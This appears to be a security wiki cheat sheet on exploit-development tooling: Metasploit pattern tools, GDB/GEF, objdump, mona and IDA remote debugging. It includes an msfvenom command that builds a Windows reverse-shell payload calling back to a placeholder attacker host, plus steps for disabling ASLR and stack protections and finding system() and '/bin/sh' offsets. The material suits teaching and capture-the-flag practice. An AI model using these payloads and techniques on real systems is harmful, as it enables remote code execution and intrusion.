# Exploiting Tools

## Metasploit

```text
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```

### Shellcodes

```text
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```

## GDB

### Install

```text
apt-get install gdb
```

### Parameters

**-q** --&gt; No show banner  
**-x &lt;file&gt;** --&gt; Auto-execute GDB instructions from here  
**-p &lt;pid&gt;** --&gt; Attach to process

#### Instructions

&gt; **disassemble main** --&gt; Disassemble the function  
&gt; **disassemble 0x12345678**  
&gt; **set disassembly-flavor intel**  
&gt; **set follow-fork-mode child/parent** --&gt; Follow created process  
&gt; **p system** --&gt; Find the address of the system function  
&gt; **help**  
&gt; **quit**

&gt; **br func**  --&gt; Add breakpoint to function  
&gt; **br \*func+23**  
&gt; **br \*0x12345678  
&gt; del NUM** --&gt; Delete that number of br  
&gt; **watch EXPRESSION** --&gt; Break if the value changes

**&gt; run** --&gt; Execute  
**&gt; start** --&gt; Start and break in main  
&gt; **n/next** --&gt; Execute next instruction \(no inside\)  
&gt; **s/step** --&gt; Execute next instruction  
&gt; **c/continue** --&gt; Continue until next breakpoint

&gt; **set $eip = 0x12345678** --&gt; Change value of $eip  
&gt; **info functions** --&gt; Info abount functions  
&gt; **info functions func** --&gt; Info of the funtion  
&gt; **info registers** --&gt; Value of the registers  
&gt; **bt** --&gt; Stack  
&gt; **bt full** --&gt; Detailed stack

&gt; **print variable**  
&gt; **print 0x87654321 - 0x12345678** --&gt; Caculate  
&gt; **examine o/x/u/t/i/s dir\_mem/reg/puntero** --&gt; Shows content in octal/hexa/10/bin/instruction/ascii

* **x/o 0xDir\_hex**
* **x/2x $eip** --&gt; 2Words from EIP
* **x/2x $eip -4** --&gt;  $eip - 4
* **x/8xb $eip** --&gt; 8  bytes \(b-&gt; byte, h-&gt; 2bytes, w-&gt; 4bytes, g-&gt; 8bytes\)
* **i r eip** --&gt; Value of $eip
* **x/w pointer** --&gt; Value of the pointer
* **x/s pointer** --&gt; String pointed by the pointer
* **x/xw &pointer** --&gt; Address where the poiniter is located
* **x/i $eip** —&gt; Instructions of the EIP

### [GEF](https://github.com/hugsy/gef)

```bash
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```

### Tricks

#### GDB same addresses

While debugging GDB will have **slightly different addresses than the used by the binary when executed.** You can make GDB have the same addresses by doing:

* `unset env LINES`
* `unset env COLUMNS`
* `set env _=<path>` _Put the absolute path to the binary_
* Exploit the binary using the same absolute route
*  `PWD` and `OLDPWD` must be the same when using GDB and when exploiting the binary

#### Backtrace to find functions called

When you have a **statically linked binary** all the functions will belong to the binary \(and no to external libraries\). In this case it will be difficult to **identify the flow that the binary follows to for example ask for user input**.  
You can easily identify this flow by **running** the binary with **gdb** until you are asked for input. Then, stop it with **CTRL+C** and use the **`bt`** \(**backtrace**\) command to see the functions called:

```text
gef➤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```

### GDB server

`gdbserver --multi 0.0.0.0:23947` \(in IDA you have to fill the absolute path of the executable in the Linux machine and in the Windows machine\)

## GCC

**gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --&gt; Compile without protections  
**-o** --&gt; Output  
**-g** --&gt; Save code \(GDB will be able to see it\)  
**echo 0 &gt; /proc/sys/kernel/randomize\_va\_space** --&gt; To deactivate the ASLR in linux

**To compile a shellcode:  
nasm -f elf assembly.asm** --&gt; return a ".o"  
**ld assembly.o -o shellcodeout** --&gt; Executable

## Objdump

**-d** --&gt; Disassemble executable sections \(see opcodes of a compiled shellcode, find ROP Gadgets, find function address...\)  
**-Mintel** --&gt; Intel sintax  
**-t** --&gt; Symbols table \(grep varBSS to get the address\)  
**-D** --&gt; Disassemble all \(address of static variable\)  
**-s -j .dtors** --&gt; Contenido de dtors  
**-s -j .got** --&gt; Contenido de got  
**-TR** --&gt; Relocations  
**ojdump -t --dynamic-relo ./exec \| grep puts** --&gt; Address of "puts" to modify in GOT  
**objdump -TR ./exec \| grep exit\(func lib\)** —&gt; Get address of all the functions inside the GOT

## Core dumps

1. Run `ulimit -c unlimited` before starting my program
2. Run `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t`
3. sudo gdb --core=&lt;path/core&gt; --quiet

## More

**ldd executable \| grep libc.so.6** --&gt; Address \(if ASLR, then this change every time\)  
**for i in \`seq 0 20\`; do ldd &lt;Ejecutable&gt; \| grep libc; done** --&gt; Loop to see if the address changes a lot  
**readelf -s /lib/i386-linux-gnu/libc.so.6 \| grep system** --&gt; Offset of "system"  
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 \| grep /bin/sh** --&gt; Offset of "/bin/sh"

**strace executable** --&gt; Functions called by the executable  
**rabin2 -i ejecutable --&gt;** Address of all the functions

**/usr/share/metasploit-framework/tools/exploit/pattern\_create.rb --length 1000  
/usr/share/metasploit-framework/tools/exploit/pattern\_offset.rb --length 1000 --query 1Ad2**

## **Inmunity debugger**

```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```

## IDA

### Debugging in remote linux

Inside the IDA folder you can find binaries that can be used to debug a binary inside a linux. To do so move the binary _linux\_server_ or _linux\_server64_ inside the linux server and run it nside the folder that contains the binary:

```text
./linux_server64 -Ppass
```

 Then, configure the debugger: Debugger \(linux remote\) --&gt; Proccess options...:

![](../../.gitbook/assets/image%20%28112%29.png)

